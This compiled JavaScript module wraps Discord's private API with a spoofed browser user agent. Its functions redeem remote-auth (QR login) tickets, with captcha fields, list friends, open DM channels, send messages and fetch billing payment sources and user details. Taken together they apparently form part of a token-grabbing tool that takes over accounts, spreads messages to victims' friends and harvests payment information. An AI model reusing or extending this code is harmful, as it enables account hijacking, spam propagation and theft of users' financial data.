"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserInformationAxios = exports.getBillingInformationAxios = exports.sendMessageWithCaptchaAxios = exports.sendMessageAxios = exports.createFriendChannelAxios = exports.getUserFriendsAxios = exports.getTicketWithCaptchaAxios = exports.getTicketAxios = void 0;
const axios_1 = __importStar(require("axios"));
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0";
async function makeRequest(method, url, data, token, additionalHeaders = {}) {
    const headers = {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
        ...additionalHeaders,
    };
    try {
        const response = await axios_1.default[method](url, data, { headers });
        return response.data;
    }
    catch (e) {
        if (e instanceof axios_1.AxiosError) {
            return e.response?.data;
        }
    }
}
const getTicketAxios = (ticket) => makeRequest("post", "https://discord.com/api/v9/users/@me/remote-auth/login", { ticket }, "");
exports.getTicketAxios = getTicketAxios;
const getTicketWithCaptchaAxios = (ticket, captcha_key, captcha_rqtoken) => makeRequest("post", "https://discord.com/api/v9/users/@me/remote-auth/login", { ticket, captcha_key, captcha_rqtoken }, "");
exports.getTicketWithCaptchaAxios = getTicketWithCaptchaAxios;
const getUserFriendsAxios = (token) => makeRequest("get", "https://discord.com/api/v9/users/@me/relationships", null, token);
exports.getUserFriendsAxios = getUserFriendsAxios;
const createFriendChannelAxios = (token, friendId) => makeRequest("post", `https://discord.com/api/v9/users/@me/channels`, { recipients: [friendId] }, token);
exports.createFriendChannelAxios = createFriendChannelAxios;
const sendMessageAxios = (token, channelId, message) => makeRequest("post", `https://discord.com/api/v9/channels/${channelId}/messages`, { content: message }, token);
exports.sendMessageAxios = sendMessageAxios;
const sendMessageWithCaptchaAxios = (token, channelId, message, captcha_key, captcha_rqtoken) => makeRequest("post", `https://discord.com/api/v9/channels/${channelId}/messages`, { content: message, captcha_key, captcha_rqtoken }, token);
exports.sendMessageWithCaptchaAxios = sendMessageWithCaptchaAxios;
const getBillingInformationAxios = (token) => makeRequest("get", `https://discord.com/api/v9/users/@me/billing/payment-sources`, null, token, { "Content-type": "application/json; charset=UTF-8" });
exports.getBillingInformationAxios = getBillingInformationAxios;
const getUserInformationAxios = (token) => makeRequest("get", `https://discord.com/api/v9/users/@me`, null, token, { "Content-type": "application/json; charset=UTF-8" });
exports.getUserInformationAxios = getUserInformationAxios;
